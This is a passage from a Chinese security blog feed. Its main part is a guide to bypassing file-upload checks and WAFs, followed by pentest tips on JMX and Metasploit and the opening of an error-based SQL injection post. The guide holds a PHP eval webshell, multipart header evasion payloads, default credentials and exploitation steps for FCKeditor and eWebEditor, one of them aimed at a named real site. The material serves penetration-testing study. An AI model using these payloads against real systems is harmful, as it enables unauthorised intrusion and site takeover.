class="string">&quot;xx.php&quot;</span></span></span><br></pre></td></tr></table></figure><p><strong>请求Header中Content-Type存在以下特征：</strong></p><ul><li>multipart&#x2F;form-data（表示该请求是一个文件上传请求）</li><li>存在boundary字符串（作用为分隔符，以区分POST数据）</li></ul><p><strong>POST的内容存在以下特征：</strong></p><ul><li>Content-Disposition</li><li>name</li><li>filename</li><li>POST中的boundary的值就是Content-Type的值在最前面加了两个–，除了最后标识结束的boundary</li></ul><h2 id="文件上传校验姿势"><a href="#文件上传校验姿势" class="headerlink" title="文件上传校验姿势"></a>文件上传校验姿势</h2><h3 id="三大校验简述"><a href="#三大校验简述" class="headerlink" title="三大校验简述"></a>三大校验简述</h3><p><strong>1、客户端javascript校验（一般只校验后缀名）</strong></p><ul><li>一般都是用javascript脚本检验上传文件的后缀</li></ul><p><strong>2、服务端校验</strong></p><ul><li>文件头content-type字段校验（image&#x2F;gif）</li><li>文件内容头校验（GIF89a）</li><li>后缀名黑名单校验</li><li>后缀名白名单校验</li><li>自定义正则校验</li></ul><p><strong>3、WAF设备校验（根据不同的WAF产品而定）</strong></p><h3 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h3><hr><h3 id="content-type字段校验"><a href="#content-type字段校验" class="headerlink" title="content-type字段校验"></a>content-type字段校验</h3><p>模拟web服务器端的校验代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] != <span class="string">&quot;image/gif&quot;</span>)  </span><br><span class="line"><span class="comment">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, we only allow uploading GIF images&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$uploaddir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadfile</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;File is valid, and was successfully uploaded.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;File uploading failed.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p><h3 id="文件头校验"><a href="#文件头校验" class="headerlink" title="文件头校验"></a>文件头校验</h3><p>主要是检测文件内容开始处的文件幻数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>） .JPEG;.JPE;.JPG，”JPGGraphic File”</span><br><span class="line">（<span class="number">2</span>） .gif，”GIF <span class="number">89</span>A”</span><br><span class="line">（<span class="number">3</span>） .zip，”Zip Compressed”</span><br><span class="line">（<span class="number">4</span>） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 <span class="keyword">or</span> Lotus Approach APRfile”</span><br></pre></td></tr></table></figure><h3 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h3><p>图像文件相关信息检测常用的就是<code>getimagesize()</code>函数，需要把文件头部分伪造好，就是在幻数的基础上还加了一些文件信息。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">GIF89a</span></span><br><span class="line">(...some <span class="keyword">binary</span> data <span class="keyword">for</span> image...)</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br><span class="line">(... skipping the rest of <span class="keyword">binary</span> data ...)</span><br></pre></td></tr></table></figure><h3 id="文件加载检测"><a href="#文件加载检测" class="headerlink" title="文件加载检测"></a>文件加载检测</h3><p>一般是调用API函数去进行文件加载测试，常见的是图像渲染测试，再变态点的是进行二次渲染。<br>对渲染&#x2F;加载测试的攻击方式是代码注入绕过；对二次渲染的攻击方式是攻击文件加载器自身。</p><p>二次渲染：相当于是把原本属于图像数据的部分抓了出来，再用自己的API或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了。</p><h2 id="文件上传绕过校验姿势"><a href="#文件上传绕过校验姿势" class="headerlink" title="文件上传绕过校验姿势"></a>文件上传绕过校验姿势</h2><h3 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h3><p>禁用JS，或者用Burp抓包改包。</p><h3 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h3><hr><h3 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h3><p>抓包改Content-type字段。</p><h3 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h3><p>在木马内容基础上再加了一些文件信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;test&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="文件后缀名绕过"><a href="#文件后缀名绕过" class="headerlink" title="文件后缀名绕过"></a>文件后缀名绕过</h3><p><strong>前提：黑名单校验<br>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。</strong><br>绕过方法：</p><ul><li>找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类</li><li>可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">能被解析的文件扩展名列表：</span><br><span class="line">jsp jspx jspf</span><br><span class="line">asp asa cer aspx</span><br><span class="line">php php php3 php4</span><br><span class="line">exe exee</span><br></pre></td></tr></table></figure><h2 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h2><p><strong>前提：校验规则只校验当文件后缀名为asp&#x2F;php&#x2F;jsp的文件内容是否为木马。</strong><br><strong>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</strong></p><ul><li>先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</li><li>然后再上传一个.php的文件，内容为<br>这个php文件就会去引用txt文件的内容，从而绕过校验.</li></ul><p>下面列举包含的语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#PHP    </span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">Include</span>(<span class="string">&quot;上传的txt文件路径&quot;</span>);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">#ASP    </span></span><br><span class="line">&lt;!--<span class="comment">#include file=&quot;上传的txt文件路径&quot; --&gt;</span></span><br><span class="line"><span class="comment">#JSP    </span></span><br><span class="line">&lt;jsp:inclde page=<span class="string">&quot;上传的txt文件路径&quot;</span>/&gt;</span><br><span class="line"><span class="keyword">or</span>  </span><br><span class="line">&lt;%@<span class="keyword">include</span> file=<span class="string">&quot;上传的txt文件路径&quot;</span>%&gt;</span><br></pre></td></tr></table></figure><h2 id="配合服务器解析漏洞"><a href="#配合服务器解析漏洞" class="headerlink" title="配合服务器解析漏洞"></a>配合服务器解析漏洞</h2><p>见<a href="https://l0ki.top/archives/240/">文件解析漏洞</a></p><h2 id="配合操作系统文件命令规则"><a href="#配合操作系统文件命令规则" class="headerlink" title="配合操作系统文件命令规则"></a>配合操作系统文件命令规则</h2><ul><li>上传不符合windows文件命名规则的文件名</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test.asp.</span><br><span class="line">test.<span class="title function_ invoke__">asp</span>(空格)</span><br><span class="line">test.php:<span class="number">1</span>.jpg</span><br><span class="line">test.php::<span class="variable">$DATA</span></span><br><span class="line">shell.php::<span class="variable">$DATA</span>…….</span><br></pre></td></tr></table></figure><p>会被windows系统自动去掉不符合规则符号后面的内容。</p><ul><li>linux下后缀名大小写</li></ul><h2 id="CMS、编辑器漏洞"><a href="#CMS、编辑器漏洞" class="headerlink" title="CMS、编辑器漏洞"></a>CMS、编辑器漏洞</h2><h3 id="fckeditor"><a href="#fckeditor" class="headerlink" title="fckeditor"></a>fckeditor</h3><p>fckeditor编辑器页&#x2F;查看编辑器版本&#x2F;查看文件上传路径</p><p>1，fckeditor编辑器页<br><code>FCKeditor/_samples/default.html</code><br>2, 查看编辑器版本<br><code>FCKeditor/_whatsnew.html</code><br>3, 查看文件上传路径<br><code>fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFile&amp;Type=image&amp;CurrentFolder=/</code></p><p><code>FCKeditor</code>编辑器漏洞的利用：</p><p>一般借助文件上传拿shell，像 &lt;2.4.x版本（也就是2.4.x及以下）</p><p>的File参数时为黑名单验证，可以通过上</p><p>传<code>.asa、.cer、.asp;jpg（针对IIS6，及文件解析漏洞）</code>。如果<code>asa、cer</code>不被解析，还可以传<code>.asp[空格]</code>。传的方法就是抓包然后</p><p>在数据包里的文件名后填个空格；高版本的像2.6.3版本存在%00</p><p>截断的，具体方法是:找到上传界面，上传图片马后，抓包修改，</p><p>在post url请求头最后面加上<code>xxx.php（或asp ）%00 </code>上传成功后</p><p>会自动将文件名截断，上传后的文件名就改成了<code>xxx.php（或asp）</code>。</p><p>绕过<code>asp;.jpg</code>变<code>asp_jpg;</code></p><p>有时服务器会把;.转义为_ ， 绕过的方法有很多，比如利用畸形文件名：&#96;&#96;a.aspx.a;a.aspx.jpg…jpg.aspx<br>xx.asp.;.jpg&#96;</p><h3 id="ewededtior"><a href="#ewededtior" class="headerlink" title="ewededtior"></a>ewededtior</h3><p><code>ewededitor</code> 利用</p><ul><li><p>1,默认后台地址:<code>/ewebeditor/admin_login.asp</code></p></li><li><p>2,检测<code>admin_style.asp</code>文件是否可以直接访问</p></li><li><p>3,默认数据库路径：<code>[path]/db/ewebeditor.mdb</code></p></li><li><p>4,某些cms 是<code>[path]/db/db.mdb</code></p></li><li><p>5,使用默认密码:<code>admin/admin888 </code>或<code>admin/admin</code> 进入后台，也可以尝试 <code>admin/123456</code>（有些管理员以及一些cms就是这么设置的）</p></li></ul><p>渗透的一般步骤：<br>找后台<br><code>admin_style.asp</code><br><code>admin/admin.asp</code><br>进后台<br>1，使用默认密码（使用一些弱口令）<br>2，下载<code>mdb</code>数据库（找到路径进入后下载）<br>3，burp 爆破<br>4，注入（找注入点用SQLmap跑）</p><p>如果以上方法都失败了，还是有机会不进入后台拿shell的：</p><p>利用<code>ewebeditor 5.2</code> 列目录漏洞<br><code>ewebeditor/asp/browser.asp</code><br>过滤不严，造成遍历目录漏洞，比如<br><code>http:// slkx.haue.edu.cn/ ewededitor/ asp/ browse.asp? style=standard650&amp;dir=…/…/…</code><br>利用<code>webeditor session</code>欺骗漏洞，进入后台。注意<code>…/</code>是返回上级目录的意思<br>拿到目录后找到数据库文件夹，能看到它的绝对路径访问下，下载下来就可以拿下这个网站了。<br>利用<code>ewebeditor PHP/ASP…</code>后台通杀漏洞（其实就是cookie欺骗）<br>影响版本：PHP&gt;&#x3D; 3.0-3.8与asp2.8版也通用<br>攻击利用：<br>进入后台<code>/ewebeditor/admin/login.php</code>，随便输入一个用户和密码，会提示出错了，这时你清空浏览器的<code>url</code>，然后输入</p><p><code>Javascript:alert(document.cookie=&quot;adminuser=&quot;+escape(&quot;admin&quot;)); Javascript:alert(document.cookie=&quot;adminpass=&quot;+escape(&quot;admin&quot;)); JavaScript:alert(document.cookie=&quot;admindj=&quot;+escape(&quot;1&quot;));</code><br>而后三次回车，清空浏览器的<code>url</code>，就可以输入一些平常访问不到的文件比如：<code>…/ewebeditor/admin/default.php</code>，就会直接进去访问。</p><h3 id="其他类型编辑器漏洞"><a href="#其他类型编辑器漏洞" class="headerlink" title="其他类型编辑器漏洞"></a>其他类型编辑器漏洞</h3><p><code>ckfinder</code>编辑器漏洞，<br>找到<code>ckfinder</code>目录下的<code>CKFinder.html</code>，上传点就在这里.<br>任意文件上传，然后利用IIS6.0文件解析漏洞，即可拿shell。<br><code>UEDITOR </code>编辑器漏洞<br>利用IIS6.0文件名解析漏洞，上传图片改名为<code>x.php;20190032342342.jpg </code>获取shell<br>PHPWEB网站管理系统后台<code>kedit</code>编辑器漏洞<br>两种利用方式<br>第一种是利用IIS6.0文件解析漏洞<br><code>xxx.php;xx.jpg</code><br>第二种方式<br>%00截断<br><code>xx.php%00jpg</code><br>等等<br>大部分编辑器漏洞都是配合文件解析漏洞拿shell</p><h2 id="配合0x00截断"><a href="#配合0x00截断" class="headerlink" title="配合0x00截断"></a>配合0x00截断</h2><p>不做过多叙述</p><h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><h3 id="WAF如何拦截"><a href="#WAF如何拦截" class="headerlink" title="WAF如何拦截"></a>WAF如何拦截</h3><ul><li>解析文件名，判断是否在黑名单内。</li><li>解析文件内容，判断是否为webshell。</li><li>文件目录权限</li></ul><p><strong>目前，市面上常见的是解析文件名，少数WAF是解析文件内容，比如长亭。下面内容，都是基于文件名解析。</strong></p><h3 id="垃圾数据"><a href="#垃圾数据" class="headerlink" title="垃圾数据"></a>垃圾数据</h3><p><strong>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。</strong></p><ul><li>构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-f6d391582b1c2336.png" alt="图片.png"></li><li>将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-a619261e549acadb.png" alt="图片.png"></li><li>将垃圾数据加到Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</li></ul><h3 id="多个filename"><a href="#多个filename" class="headerlink" title="多个filename"></a>多个filename</h3><p>早期版本安全狗，可以多加一个filename</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure><p><strong>最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</strong></p><h3 id="交换name和filename的顺序"><a href="#交换name和filename的顺序" class="headerlink" title="交换name和filename的顺序"></a>交换name和filename的顺序</h3><p>规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; filename=&quot;xx.php&quot;; name=file_x</span><br></pre></td></tr></table></figure><h3 id="去掉引号-双引号变成单引号"><a href="#去掉引号-双引号变成单引号" class="headerlink" title="去掉引号,双引号变成单引号"></a>去掉引号,双引号变成单引号</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=file_x; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line">Content-Disposition: form-data; name=file_x; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file_x&quot;</span>; filename=xx.php</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&#x27;file_x&#x27;</span>; filename=<span class="string">&#x27;xx.php&#x27;</span></span><br></pre></td></tr></table></figure><p>单引号、双引号、不要引号，都能上传。</p><h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><p>对这三个固定的字符串进行大小写转换</p><ul><li>Content-Disposition</li><li>name</li><li>filename</li></ul><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>在<code>: ; =</code>添加1个或者多个空格。</p><h3 id="去掉或修改Content-Disposition值"><a href="#去掉或修改Content-Disposition值" class="headerlink" title="去掉或修改Content-Disposition值"></a>去掉或修改Content-Disposition值</h3><p>有的WAF在解析的时候，认为<code>Content-Disposition</code>值一定是<code>form-data</code>，造成绕过。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>name=&#x27;file_x&#x27;; filename=&#x27;xx.php&#x27;</span><br></pre></td></tr></table></figure><h3 id="多个boundary"><a href="#多个boundary" class="headerlink" title="多个boundary"></a>多个boundary</h3><p>最后上传的文件是<code>test.php</code>而非<code>test.txt</code>，但是取的文件名只取了第一个就会被Bypass。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/javascript</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file_x&quot;; filename=&quot;test.php&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/javascript</span><br></pre></td></tr></table></figure><h3 id="多个分号"><a href="#多个分号" class="headerlink" title="多个分号"></a>多个分号</h3><p>文件解析时，可能解析不到文件名，导致绕过。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file_x&quot;;;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure><h3 id="Header在boundary前添加任意字符"><a href="#Header在boundary前添加任意字符" class="headerlink" title="Header在boundary前添加任意字符"></a>Header在boundary前添加任意字符</h3><p>PHP支持，JAVA报错</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br></pre></td></tr></table></figure><h3 id="filename换行"><a href="#filename换行" class="headerlink" title="filename换行"></a>filename换行</h3><p>PHP支持，Java不支持。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file_x&quot;; file</span><br><span class="line">name=&quot;test.php&quot;</span><br></pre></td></tr></table></figure><h3 id="name和filename添加任意字符串"><a href="#name和filename添加任意字符串" class="headerlink" title="name和filename添加任意字符串"></a>name和filename添加任意字符串</h3><p>PHP支持，Java不支持。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>name=&quot;file_x&quot;; bypass waf upload; filename=&quot;test.php&quot;;</span><br></pre></td></tr></table></figure><h3 id="POST-GET"><a href="#POST-GET" class="headerlink" title="POST&#x2F;GET"></a>POST&#x2F;GET</h3><p><strong>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。</strong><br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Little Tips</title>
      <link href="/2020/07/15/Marks/"/>
      <url>/2020/07/15/Marks/</url>
      
        <content type="html"><![CDATA[<p>7.15<br>对于腾讯系或阿里系,进行目录结构扫描时,dirsearch需要加参数-s 2或3（慢一点，不然扫不到）</p><p>7.27</p><p>使用nmap对端口服务探测 <code>nmap -sV -p port ip</code></p><p>开启的 jmx 服务默认是不需要验证的</p><p>未授权的话可以直接连</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jconsole  ip:port</span><br></pre></td></tr></table></figure><p>检测JMX RMI漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf:</span><br><span class="line">use auxiliary/scanner/misc/java_rmi_server</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap脚本:</span><br><span class="line">nmap --script=rmi-vuln-classloader -p 18983 127.0.0.1</span><br></pre></td></tr></table></figure><p>利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf:</span><br><span class="line">use exploit/multi/misc/java_jmx_server</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">github:</span><br><span class="line">mjet</span><br></pre></td></tr></table></figure><p>7.28</p><p>asp或aspx getshell 可以使用上传AspxSpy2014 Final</p><p>7.29</p><p>JAVA创建进程的三种方式ProcessBuilder、Runtime、Process</p><p>8.14</p><p>Docker 和UFW 防火墙的安全漏洞</p><p>将UFW防火墙设置为拒绝所有通信（除SSH），但是它竟然允许与MongoDB连接访问</p><p>解决方式:</p><p>回到Docker服务器上的终端界面，并发出<code>sudo nano /etc/default/docker</code>命令并添加以下命令：</p><p><code>DOCKER_OPTS=&quot;--iptables=false&quot;</code></p><p>保存并关闭该文件。使用<code>sudo systemctl restart docker</code> 命令来重启docker守护进程。现在，当部署一个容器时，它将不再改变<code>iptables</code>并且严格遵守UFW防火墙的设置规则。</p><p>12.15</p><p>url组成</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1188607-20190524123004043-1112804791.png" alt="img"></p><p>1.<strong>协议</strong>：模式&#x2F;协议（scheme）,在Internet中可使用多种协议，如HTTP，FTP等。在”HTTP”后面的“&#x2F;&#x2F;”为分隔符</p><p>2.<strong>域名</strong>：也可使用IP地址作为域名使用。</p><p>3.<strong>端口</strong>：不是一个URL必须的部分，如果省略端口部分，将采用默认端口。</p><p>4.<strong>虚拟目录</strong>：从域名后的第一个“&#x2F;”开始到最后一个“&#x2F;”为止。虚拟目录不是一个URL必须的部分。</p><p>5.<strong>文件名</strong>：从域名后的最后一个“&#x2F;”至“？”(或“#”或至结束)为止，是文件名部分。</p><p>　　文件名部分不是一个URL必须的部分，如果省略该部分，则使用默认的文件名。</p><p>7.<strong>参数</strong>：从“？”开始到“#”（或至结束）为止之间的部分为参数部分，又称搜索部分、查询部分。参数间用“&amp;”作为分隔符。</p><p>6.<strong>锚</strong>：或称片段（fragment），HTTP请求不包括锚部分，从“#”开始到最后，都是锚部分。本例中的锚部分是“r_70732423“。锚部分不是一个URL必须的部分。</p><p>　　锚点作用：打开用户页面时滚动到该锚点位置。如：一个html页面中有一段代码【<div name='r_70732423'>…</div>】，该url的hash为r_70732423</p><p>完整结构说明：</p><p>　　基本URL包含模式（或称协议）、服务器名称（或IP地址）、路径和文件名，如“协议：&#x2F;&#x2F;授权&#x2F;路径?查询”。</p><p>　　完整的、带有授权部分的普通统一资源标志符语法看上去如下：协议：&#x2F;&#x2F;用户名:密码@子域名.域名.顶级域名:端口号&#x2F;目录&#x2F;文件名.文件后缀?参数&#x3D;值#标志。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Encountered Dubbo Deserialization Vulnerability in Practice</title>
      <link href="/2020/07/14/Practical-Dubbo-Deserialization-Vulnerability/"/>
      <url>/2020/07/14/Practical-Dubbo-Deserialization-Vulnerability/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9b4286f67b4a36f0c17aaf7167b5f03e4891296fd348880bb9c59c825e7abadc"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3 Common Types of Error-SQL Injection</title>
      <link href="/2020/07/12/3-Common-Error-SQL-Injection/"/>
      <url>/2020/07/12/3-Common-Error-SQL-Injection/</url>
      
        <content type="html"><![CDATA[<h2 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h2><h3 id="原理概述"><a href="#原理概述" class="headerlink" title="原理概述"></a>原理概述</h3><blockquote><p>当传递一个大于709的值时，<code>函数exp()</code>就会引起一个溢出错误</p><p>适用版本：5.5.5~5.5.49</p></blockquote><p>对于数据较大的次方，其次方每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错<br>故，当传递一个大于709的值时，函数exp()就会引起一个重叠错误。</p><p>如图：可以很明显的看到溢出错误</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200712163442345.png" alt="image-20200712163442345"></p><p>在<code>MySQL</code>中，<code>exp</code>与<code>ln</code>和<code>log</code>的功能相反，也就是<code>log</code>和<code>ln</code>都返回以e为底数的对数,而<code>exp()</code>即为以e为底的对数函数，如图进行换算：</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200712163602002.png" alt="image-20200712163602002"></p><h3 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------------------------------</span><br><span 